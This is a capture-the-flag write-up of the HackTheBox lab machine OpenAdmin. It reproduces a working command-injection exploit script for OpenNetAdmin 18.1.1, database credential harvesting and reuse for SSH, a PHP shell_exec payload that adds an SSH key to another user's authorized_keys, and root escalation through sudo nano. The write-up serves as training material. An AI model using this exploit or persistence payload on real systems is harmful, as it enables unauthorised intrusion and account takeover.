---
title: "Openadmin - HackTheBox"
date: 2020-05-02T20:00:00+01:00
tags: [HackTheBox, Exploit, RCE, GTFOBins]
---

![](/images/hackthebox/openadmin/info.png)

OpenAdmin is an easy machine from Hack The Box involving a RCE vulnerability on
a web app, finding a password in configuration files and using `nano` to become
root.

## Information gathering

Let's run a quick port scan:
```
$ nmap -A -T4 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-06 14:30 EST
Nmap scan report for 10.10.10.171
Host is up (0.044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The HTTP server is just the default Apache homepage, let's run a discovery:

```
$ ffuf -r -c -ac -w raft-small-words-lowercase.txt -u http://10.10.10.171/FUZZ

.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376]
music                   [Status: 200, Size: 12554, Words: 764, Lines: 356]
artwork                 [Status: 200, Size: 14461, Words: 4026, Lines: 372]
sierra                  [Status: 200, Size: 43015, Words: 14866, Lines: 589]
```

I browsed a bit in the three directories but they just looked like stock
websites but then, while I was doing my usual recon process, I used
[hakrawler](https://github.com/hakluke/hakrawler) to enumerate all the links in
the websites and found this:

```
[url] http://10.10.10.171/ona
```

It's the control panel for OpenNetAdmin, an application used to manage IP
addresses:
![](/images/hackthebox/openadmin/ona.png)

## Remote command execution

Whenever there's a web app I look for exploits:
```
$ searchsploit opennetadmin
-------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                 | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)  | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                   | exploits/php/webapps/47691.sh
-------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

It looks like there are two for the exact version on the server. Being a 20
points machine It should work out of the box. This is the exploit code:
```bash
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

It's an RCE exploit on the login form, and it uses the `xajaxargs` parameter to
inject a command, let's run it:
```
$ ./47691.sh http://10.10.10.171/ona/login.php
$ whoami
www-data
```

As expected, we are `www-data`, let's see where the commands are being run:
```
$ pwd
/opt/ona/www
```

I found a virtual host while enumerating:
```
$ ls /etc/apache2/sites-enabled
internal.conf
openadmin.conf
```

Let's check it's configuration:
```
$ cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

It's running as user `joanna`, but we cant't read the files in it's root because
of the permissions:
```
$ ls -la /var/www
total 16
drwxr-xr-x  4 root     root     4096 Nov 22 18:15 .
drwxr-xr-x 14 root     root     4096 Nov 21 14:08 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22 15:59 html
drwxrwx---  2 jimmy    internal 4096 Nov 23 17:43 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
```

We can, however, use the exploit to make requests to the internal port:
```html
$ curl localhost:52846

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
                </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "/index.php" method = "post">
            <h4 class = "form-signin-heading"></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```

There's a login form, so there must be some kind of database, let's check what
ports are listening
```
$ ss -tl
State    Recv-Q    Send-Q        Local Address:Port         Peer Address:Port
LISTEN   0         80                127.0.0.1:mysql             0.0.0.0:*
LISTEN   0         128               127.0.0.1:52846             0.0.0.0:*
LISTEN   0         128           127.0.0.53%lo:domain            0.0.0.0:*
LISTEN   0         128                 0.0.0.0:ssh               0.0.0.0:*
LISTEN   0         128                       *:http                    *:*
LISTEN   0         128                    [::]:ssh                  [::]:*
```

Let's search for any file that might be database related:
```
$ find / -iname '*database*'
/usr/share/mime/application/vnd.oasis.opendocument.database.xml
/usr/share/man/man1/update-mime-database.1.gz
/usr/share/lintian/overrides/geoip-database
/usr/share/doc/geoip-database
/usr/bin/update-mime-database
/opt/ona/www/images/silk/database_add.png
/opt/ona/www/images/silk/database_connect.png
/opt/ona/www/images/silk/database_go.png
/opt/ona/www/images/silk/database_table.png
/opt/ona/www/images/silk/database_key.png
/opt/ona/www/images/silk/database.png
/opt/ona/www/images/silk/database_delete.png
/opt/ona/www/images/silk/icons/database_add.png
/opt/ona/www/images/silk/icons/database_connect.png
/opt/ona/www/images/silk/icons/database_go.png
/opt/ona/www/images/silk/icons/database_table.png
/opt/ona/www/images/silk/icons/database_key.png
/opt/ona/www/images/silk/icons/database.png
/opt/ona/www/images/silk/icons/database_delete.png
/opt/ona/www/images/silk/icons/database_refresh.png
/opt/ona/www/images/silk/icons/database_link.png
/opt/ona/www/images/silk/icons/folder_database.png
/opt/ona/www/images/silk/icons/database_error.png
/opt/ona/www/images/silk/icons/server_database.png
/opt/ona/www/images/silk/icons/page_white_database.png
/opt/ona/www/images/silk/icons/database_lightning.png
/opt/ona/www/images/silk/icons/database_save.png
/opt/ona/www/images/silk/icons/database_edit.png
/opt/ona/www/images/silk/icons/database_gear.png
/opt/ona/www/images/silk/database_refresh.png
/opt/ona/www/images/silk/database_link.png
/opt/ona/www/images/silk/folder_database.png
/opt/ona/www/images/silk/database_error.png
/opt/ona/www/images/silk/server_database.png
/opt/ona/www/images/silk/page_white_database.png
/opt/ona/www/images/silk/database_lightning.png
/opt/ona/www/images/silk/database_save.png
/opt/ona/www/images/silk/database_edit.png
/opt/ona/www/images/silk/database_gear.png
/opt/ona/www/local/config/database_settings.inc.php
/var/lib/systemd/catalog/database
/var/lib/dpkg/info/geoip-database.list
/var/lib/dpkg/info/geoip-database.md5sums
/snap/core/7270/var/lib/systemd/catalog/database
/snap/core/8039/var/lib/systemd/catalog/database
```

Looks like we have the configuration file for OpenNetAdmin, let's check it:
```
$ cat /opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

We cannot use the mysql client interactively, but we can pipe the password into
it and run commands. Let's see what tables are available:
```
$ echo 'n1nj4W4rri0R!' | mysql -h localhost -u ona_sys -p ona_default -e 'SHOW TABLES'
Tables_in_ona_default
blocks
configuration_types
configurations
custom_attribute_types
custom_attributes
dcm_module_list
device_types
devices
dhcp_failover_groups
dhcp_option_entries
dhcp_options
dhcp_pools
dhcp_server_subnets
dns
dns_server_domains
dns_views
domains
group_assignments
groups
host_roles
hosts
interface_clusters
interfaces
locations
manufacturers
messages
models
ona_logs
permission_assignments
permissions
roles
sequences
sessions
subnet_types
subnets
sys_config
tags
users
vlan_campuses
vlans
```

Let's dump the table
```
$ echo 'n1nj4W4rri0R!' | mysql -h localhost -u ona_sys -p ona_default -e 'select * from users'
Enter password: id      username        password        level   ctime   atime
1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-01-07 14:55:02     2020-01-07 14:55:02
2       admin   21232f297a57a5a743894a0e4a801fc3        0       2020-01-07 14:00:11     2020-01-07 14:00:11
```

`21232f297a57a5a743894a0e4a801fc3` is `admin` in md5, but those are the
passwords for the OpenNetAdmin panel.

I got stuck for a while, until I tried to use the same database password to
login in ssh as `jimmy`, but no flag for us:
```
jimmy@openadmin:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .gnupg  .local  .profile
```

We have to escalate to `joanna`:
```
jimmy@openadmin:~$ ls -l /home
total 8
drwxr-x--- 5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
drwxr-x--- 6 joanna joanna 4096 Nov 28 09:37 joanna
```

But now, being user `jimmy` we can read and write in the root directory of the
web server running as `joanna`!

Let's write a hidden PHP file (to not ruin the experience for other players) in
`/var/www/internal` to add an ssh key to the authorized ones:
```php
<?php
shell_exec('mkdir /home/.ssh/joanna; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ7lj5Kmp8jUe/XI8gZbto6uxwZrtVj+0uCKD1SyR8uIUdzBbY9SKg8I5Lsn4aC5tTgHl70XoNjWEls5BDJfUKIfbGrjICwW0oEcCEyanLHzI6CRXzw/IzHBGdPqqmuU/TEiLY574IslRD6AI2uNu9ZXPto0OnHsvIcH7F84A8frW+3JkJ9nRKkIDKyJ/KVc7O121dHQiyBDeekw0XZKsl4ghlUua8mmt+kE5/5bAY9eFxAleNIINkurmXQR5k6e0g+JpUr3VMAqX/xLiNl9cS/kXbox6hkYfx2gcm1fkPtCDikzXMPutnRGBaBahcKqQ8Lv2y1DpTKiNoFs8kUuA5KFGHZW0lvh+hhGC0QCC0WgDF5DiJKLBn4wuEZnzM/JKXSeWkMiV5h6OsXp0aY5qHKbqXP/XQrLp1L5ftqux0A+pu3mLlEKfrNKJQmT+J2CnwlG1+0n/o8AFsTT9jCjL2jz2HGgYvJVzZ3v1JSj6F17MNbxP6IrCrhxn9YZcjhQM= samir@072b117c964b" >> /home/joanna/.ssh/authorized_keys');
?>
```

Let's connect and check the flag file:
```
$ joanna@openadmin:~$ wc -c user.txt
33 user.txt
```

# Privilege escalation
This step is really quick, seeing which commands `joanna` can run with sudo we
see one:
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

So we can run `sudo /bin/nano /opt/priv` without being asked for a password,
and use CTRL+R to open any file, or even better get a shell as described
[here](https://gtfobins.github.io/gtfobins/nano/)

Let's check root's flag:
```
# wc -c /root/root.txt
33 /root/root.txt
```

Quick and easy, thanks for reading!
